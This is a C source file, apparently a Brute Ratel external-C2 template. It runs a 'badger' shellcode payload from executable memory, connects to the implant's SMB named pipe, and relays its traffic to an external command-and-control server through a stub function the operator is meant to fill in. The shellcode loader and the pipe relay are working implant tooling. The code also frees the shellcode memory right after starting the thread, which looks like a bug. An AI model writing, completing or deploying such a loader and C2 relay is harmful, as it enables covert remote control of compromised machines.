#include <windows.h>
#include "shellcode.h"

size_t task_strlen(CHAR* buf) {
    size_t i = 0;
    while (buf[i] != '\0') {
        i++;
    }
    return i;
}

void *task_memcpy(void *dest, const void *src, size_t len) {
    char *d = dest;
    const char *s = src;
    while (len--) {
        *d++ = *s++;
    }
    return dest;
}

void *task_memset(void *dest, int val, size_t len) {
    unsigned char *ptr = dest;
    while (len-- > 0) {
        *ptr++ = val;
    }
    return dest;
}

CHAR* SendToExternalC2Server(CHAR* request) {
    CHAR* response = NULL;
    // Write Code Logic here to forward the SMB badger's request to the Ratel Server, fetch the output and return it to the SMB Badger
    return response;
}

CHAR* readFromPipe(HANDLE badgerNamedPipe) {
    CHAR* pipeBuffer = NULL;
    CHAR *recvbuf = (CHAR*)calloc(65535+1, sizeof(CHAR));
    DWORD offset = 0;
    while (TRUE) {
        DWORD retVal = 0, bytesRead = 0;
        // Named pipes can only read a maximum of 65535 bytes. So loop untill all buffer is received
        retVal = ReadFile(badgerNamedPipe, recvbuf, 65535, &bytesRead, NULL);
        if (!retVal || bytesRead == 0) {
            if (GetLastError() != ERROR_MORE_DATA) {
                // Kill this process if the shellcode disconnects over named pipe
                ExitProcess(0);
            }
        }
        // old (offset) + new (bytesread) = new size of buffer
        DWORD newSizeOfBuff = offset + bytesRead + 1;
        pipeBuffer = (CHAR*)realloc(pipeBuffer, newSizeOfBuff);
        task_memcpy(pipeBuffer+offset, recvbuf, bytesRead);
        // old (offset) + new (bytesread) = new size of buffer
        offset = offset + bytesRead;
        // Add null byte
        pipeBuffer[offset] = 0;
        task_memset(recvbuf, 0, 65535+1);
        if (bytesRead < 65535) {
            break;
        }
    }
    free(recvbuf);
    return pipeBuffer;
}

VOID BadgerHandler(HANDLE badgerNamedPipe) {
    while (TRUE) {
        // receive the badger's request
        BOOL isSuccess = FALSE;
        CHAR* response = NULL;
        CHAR* request = readFromPipe(badgerNamedPipe);
        if (request) {
            // if the request was successful, forward it to the External C2 Server
            response = SendToExternalC2Server(request);
            DWORD bytesWritten = 0;
            // if a response exists, forward it to the badger's named pipe
            if (response) {
                DWORD response_len = task_strlen(response);
                if (WriteFile(badgerNamedPipe, response, response_len, &bytesWritten, NULL)) {
                    isSuccess = TRUE;
                }
            } else {
                // else just write 1 byte to specify it was a success
                if (WriteFile(badgerNamedPipe, "", 1, &bytesWritten, NULL)) {
                    isSuccess = TRUE;
                }
            }
        }
        // if 'isSuccess' is false, the operator has to handle this since it means there was a failure in connection
        free(response);
        free(request);
    }
}


HANDLE ConnectBadger(CHAR* smbPipeName) {
    // set the message mode to byte or string, both work
	DWORD dwMode = PIPE_READMODE_BYTE | PIPE_WAIT;
    // create a named object
    HANDLE badgerNamedPipe = CreateFileA(smbPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL);
    if (badgerNamedPipe == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    // set the handle state to the message mode
	if (! SetNamedPipeHandleState(badgerNamedPipe, &dwMode, NULL, NULL)) {
        CloseHandle(badgerNamedPipe);
        return NULL;
	}
    return badgerNamedPipe;
}

void execShellcode() {
    DWORD lpThreadId = 0;
    DWORD flOldProtect;
    LPVOID shellcodeAlloc = VirtualAlloc(NULL, shellcode_len, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    task_memcpy(shellcodeAlloc, shellcode, shellcode_len);
    VirtualProtect(shellcodeAlloc, shellcode_len, PAGE_EXECUTE_READ, &flOldProtect);
    CreateThread(NULL, 1024*1024, (LPTHREAD_START_ROUTINE)shellcodeAlloc, NULL, 0, &lpThreadId);
    VirtualFree(shellcodeAlloc, 0, MEM_RELEASE);
    // It's good to wait for a second before returning as the shellcode might take 200-500ms to start the named pipe
    Sleep(1000);
}

int main() {
    // Execute badger's SMB shellcode before connecting to the named pipe
    execShellcode();
    // Connect to the named pipe of your SMB Badger
    HANDLE badgerNamedPipe = ConnectBadger("\\\\.\\pipe\\mynamedpipe");
    if (! badgerNamedPipe) {
        return 0;
    }
    // Send initial badger request and receive the authentication token from the Ratel server
    BadgerHandler(badgerNamedPipe);
    return 0;
}